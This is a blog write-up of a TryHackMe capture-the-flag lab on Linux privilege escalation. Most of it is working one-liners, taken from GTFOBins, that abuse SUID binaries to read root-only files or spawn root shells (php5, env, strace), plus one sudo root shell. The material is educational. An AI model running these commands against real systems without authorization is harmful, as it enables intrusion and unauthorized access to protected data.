---
layout: post
permalink: /posts/thm/linux-privesc-playground
title: "THM write-up: Linux Privesc Playground"
date: 2020-08-13 20:48
tags: tryhackme privilege_escalate
description: "Welcome back to another THM CTF writeup. Today, we are going for the most easiest Privilege Escalate (privesc) in the entire THM server."
---

![titlecard](/assets/images/THM/2020-08-13-linux-privesc-playground/1.png)

[Link: https://tryhackme.com/room/privescplayground](https://tryhackme.com/room/privescplayground)

Hello, there and it has been a while since my last update, welcome back to another THM CTF writeup. Today, we are going for the most easiest Privilege Escalate (privesc) in the entire THM server. Just like the author, SherlockSec mentioned, there are tons of ways to privesc the machine. Just a small tip, I referred the [GTFObin](https://gtfobins.github.io) for this challenge. The site contains a list of shell-escaping command. Furthermore, I break the write-up into two major sections, the SUID and the SUDO. Without further ado, let's get started.

## Part 1: SUID

SUID exploitation is quite common in Linux especially users misconfigure the important /bin and /sbin files. If you wanted to know more about SUID exploitation, you can refer to this [article](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/). To do a quick search on the SUID files on the system file, simply use the following command

```
find / -perm /4000 2>/dev/null
```

The perm 4000 represents permission 4000 which is an SUID bit and we are going to skip all 'permission denied' search by using 2>/dev/null/. Alternatively, you also can use mnemonic shortcuts.

```
find / -perm /u=s 2>/dev/null
```

![suid](/assets/images/THM/2020-08-13-linux-privesc-playground/2.png)

Well, there are tons of SUID to exploit with. Always check with the [GTFObins](https://gtfobins.github.io) and look for the possible SUID file exploitation. Here is the list of SUID that can be exploited.

- arp
- cut
- base64
- tail
- ul
- shuf
- php5
- file
- tclsh8.5
- env
- diff
- strach
- rlwrap
- ...... and anything you can find on [GTFObins](https://gtfobins.github.io).

For this instance, I'm going to show you the 12 SUID exploitation as a demo and you can figure out the rest using GTFObins.

### SUID 1: arp

[Link: https://gtfobins.github.io/gtfobins/arp/](https://gtfobins.github.io/gtfobins/arp/)

```
/usr/sbin/arp -v -f /root/flag.txt
```

![arp](/assets/images/THM/2020-08-13-linux-privesc-playground/3.png)

### SUID 2: cut

[Link: https://gtfobins.github.io/gtfobins/cut/](https://gtfobins.github.io/gtfobins/cut/)

```
/usr/bin/cut -d "" -f1 /root/flag.txt
```

![cut](/assets/images/THM/2020-08-13-linux-privesc-playground/4.png)

### SUID 3: base64

[Link: https://gtfobins.github.io/gtfobins/base64/](https://gtfobins.github.io/gtfobins/base64/)

```
/usr/bin/base64 /root/flag.txt | base64 --decode
```

![base64](/assets/images/THM/2020-08-13-linux-privesc-playground/5.png)

### SUID 4: tail

[Link: https://gtfobins.github.io/gtfobins/tail/](https://gtfobins.github.io/gtfobins/tail/)

```
/usr/bin/tail /root/flag.txt
```

![tail](/assets/images/THM/2020-08-13-linux-privesc-playground/6.png)

### SUID 5: ul

[Link: https://gtfobins.github.io/gtfobins/ul/](https://gtfobins.github.io/gtfobins/ul/)

```
/usr/bin/ul /root/flag.txt
```

![ul](/assets/images/THM/2020-08-13-linux-privesc-playground/7.png)

### SUID 6: shuf

[Link: https://gtfobins.github.io/gtfobins/shuf/](https://gtfobins.github.io/gtfobins/shuf/)

Instead of reading the flag file like the previous SUID, shuf is used to overwrite the file. This SUID command is quite useful to rewrite the configuration file which cannot be done by lower privileged users. No demo for this SUID.

### SUID 7: php5

[Link: https://gtfobins.github.io/gtfobins/php/](https://gtfobins.github.io/gtfobins/php/)

```
/usr/bin/php5 -r "pcntl_exec('/bin/sh');"
```

![php5](/assets/images/THM/2020-08-13-linux-privesc-playground/8.png)

### SUID 8: file

[Link: https://gtfobins.github.io/gtfobins/file/](https://gtfobins.github.io/gtfobins/file/)

```
/usr/bin/file -m /root/flag.txt
```

![file](/assets/images/THM/2020-08-13-linux-privesc-playground/9.png)

### SUID 9: tclsh8.5

[Link: https://gtfobins.github.io/gtfobins/tclsh/](https://gtfobins.github.io/gtfobins/tclsh/)

```
/usr/bin/tclsh8.5
exec cat /root/flag.txt
```

![tclsh](/assets/images/THM/2020-08-13-linux-privesc-playground/10.png)

### SUID 10: env

[Link: https://gtfobins.github.io/gtfobins/env/](https://gtfobins.github.io/gtfobins/env/)

```
/usr/bin/env /bin/sh
```

![env](/assets/images/THM/2020-08-13-linux-privesc-playground/11.png)

### SUID 11: diff

[Link: https://gtfobins.github.io/gtfobins/diff/](https://gtfobins.github.io/gtfobins/diff/)

```
/usr/bin/diff --line-format=%L /dev/null /root/flag.txt
```

![diff](/assets/images/THM/2020-08-13-linux-privesc-playground/12.png)

### SUID 12: strace

[Link: https://gtfobins.github.io/gtfobins/strace/](https://gtfobins.github.io/gtfobins/strace/)

```
/usr/bin/strace -o /dev/null /bin/sh
```

![strace](/assets/images/THM/2020-08-13-linux-privesc-playground/13.png)

## Part 2: Sudo

Another privilege escalation method is sudo command. Just small tips here, always check with the ./etc/sudoers or visudo command to check for any misconfiguration on user privilege. To check with the sudo command of a lower privilege user, simply punch in the following line.

```
sudo -l
```

![sudo](/assets/images/THM/2020-08-13-linux-privesc-playground/14.png)

Actually it is rare to see this kind of stuff in real life. The lower privilege user literally can run anything as sudo. Similarly, you can check the GTFObins for [sudo shell-escape](https://gtfobins.github.io/#+sudo). For this demo, I'm going to use the command sudo command, the bash.

```
sudo /bin/bash
```

![sudo bash](/assets/images/THM/2020-08-13-linux-privesc-playground/15.png)

## Conclusion

That's all for the quick write-up for privesc playground. GTFObins is definitely a useful site to check with the priv escalation in terms of SUID and SUDO. One more thing, check out [mzfr's GTFObins tool](https://github.com/mzfr/gtfo), he did a great job on beautifying the tool via terminal. Until next time :)
